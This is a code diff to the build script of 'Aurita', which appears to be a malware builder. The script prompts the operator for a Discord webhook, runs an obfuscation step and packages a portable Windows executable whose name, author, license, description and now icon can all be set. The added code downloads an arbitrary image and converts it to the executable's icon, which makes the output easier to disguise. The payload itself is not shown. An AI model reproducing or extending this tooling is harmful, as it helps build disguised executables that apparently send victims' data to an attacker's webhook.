@@ -1,4 +1,4 @@
-const { key_res, decode_B64, msg, is_webhook } = require("./src/utils/functions/functions.js");
+const { key_res, decode_B64, msg, is_webhook, is_link_icon } = require("./src/utils/functions/functions.js");
 const { build, Platform, Arch } = require("electron-builder");
 const { spawnSync } = require("child_process");
 const readline = require("readline");
@@ -15,14 +15,36 @@ const SRC_DIR = "./src";
 
 const create_build = async (dest, JSON) => {
   const EXECUTABLE_NAME = JSON.EXECUTABLE_NAME ?? "Aurita";
-  const ICON = "https://cdn.discordapp.com/attachments/1200154153226354779/1223844486157697074/icon.ico?ex=661b54ff&is=6608dfff&hm=e1af9ca47da02e42b86373fa1c76e40a9f52f6afa6337bc46738c83833fc44a7&";
+  const EXECUTABLE_ICON = JSON.EXECUTABLE_ICON ?? "https://cdn.discordapp.com/attachments/1200154153226354779/1221510827517939743/05437e8b15bf60db9f5b995a1f791ab3.jpg?ex=662dde5b&is=662c8cdb&hm=e17935e0235643328f84cd1dbd519618a6f926859582386877b6d8b6e8425c45&";
+  
+  const TEMP_IMAGE_PATH = `${process.cwd()}/build/icons/${EXECUTABLE_NAME}.png`;
+  const ICON_PATH = `${process.cwd()}/build/icons/${EXECUTABLE_NAME}.ico`;
 
   try {
 
-    if (ICON) {
-      const ICON_BUFFER = Buffer.from((await axios.get(ICON, { responseType: "arraybuffer" })).data);
-      if (ICON_BUFFER.length <= 500 * 1024) fs.writeFileSync(`${process.cwd()}/src/node.ico`, ICON_BUFFER);
-    }
+    axios({
+      method: 'get',
+      url: EXECUTABLE_ICON,
+      responseType: 'stream',
+    }).then(response => {
+      const WRITER = fs.createWriteStream(TEMP_IMAGE_PATH);
+
+      response.data.pipe(WRITER);
+      WRITER.on('finish', () => {
+        require('image-to-ico')(TEMP_IMAGE_PATH, {
+          size: [256, 256],
+          quality: 100,
+          greyscale: false
+        }).then(buf => {
+          fs.writeFileSync(ICON_PATH, buf);
+          fs.unlinkSync(TEMP_IMAGE_PATH);
+        }).catch(err => {
+          console.log(`Error converting image to ICO: ${err}`)
+        });
+      });
+    }).catch(err => {
+      console.log(`Error downloading image: ${err}`)
+    });
 
     await build({
       "targets": Platform.WINDOWS.createTarget(null, Arch.x64),
@@ -32,7 +54,7 @@ const create_build = async (dest, JSON) => {
         "win": {
           "artifactName": `${EXECUTABLE_NAME}.exe`,
           "target": "portable",
-          "icon": `${process.cwd()}/src/node.ico`
+          "icon": ICON_PATH
         },
         "compression": "normal",
         "buildVersion": "1.0.0",
@@ -68,6 +90,7 @@ const create_build = async (dest, JSON) => {
 const create_obfuscation = async (JSON) => {
   let WEBHOOK = JSON.WEBHOOK,
     EXECUTABLE_NAME = JSON.EXECUTABLE_NAME ?? "Aurita",
+    EXECUTABLE_ICON = JSON.EXECUTABLE_ICON ?? "https://cdn.discordapp.com/attachments/1200154153226354779/1221510827517939743/05437e8b15bf60db9f5b995a1f791ab3.jpg?ex=662dde5b&is=662c8cdb&hm=e17935e0235643328f84cd1dbd519618a6f926859582386877b6d8b6e8425c45&",
     AUTHOR = JSON.AUTHOR ?? "k4itrun",
     LICENSE = JSON.LICENSE ?? "MIT",
     DESC = JSON.DESC ?? "Do Do-Hee <3",
@@ -104,7 +127,7 @@ const create_obfuscation = async (JSON) => {
         if (fs.statSync(FILE_PATH).isDirectory()) {
           await obf_files(FILE_PATH);
         } else if (file.endsWith(".js") && !FILE_PATH.includes("node_modules") && !file.includes("build.js")) {
-          
+
           await fs.writeFileSync(FILE_PATH, fs.readFileSync(FILE_PATH, "utf-8")); //later added better obfuscation
 
         }
@@ -216,13 +239,17 @@ async function create_fucking() {
       });
 
       console.clear();
-      console.log(instagram(MAIN_BANNER)); 
+      console.log(instagram(MAIN_BANNER));
 
       let webhook = await ask("Add your \"WEBHOOK\": ");
       while (!is_webhook(webhook)) webhook = await ask("Add a \"WEBHOOK\" validity: ");
 
+      let ex_icon =  await ask("Please specify the \"ICON\" using a url with the extensions (Png, Jpg, WebP): ");
+      while (!is_link_icon(ex_icon)) ex_icon = await ask("Specify a valid link for your \"ICON\" the extensions (Png, Jpg, WebP): ");
+
       JSON["WEBHOOK"] = webhook;
       JSON["EXECUTABLE_NAME"] = await ask("Please specify your 'EXE' file \"Name\": ");
+      JSON["EXECUTABLE_ICON"] = ex_icon
       JSON["AUTHOR"] = await ask("Please specify your 'EXE' file \"Author\": ");
       JSON["LICENSE"] = await ask("Please specify your 'EXE' file \"License\": ");
       JSON["DESC"] = await ask("Please specify your 'EXE' file \"Description\": ");
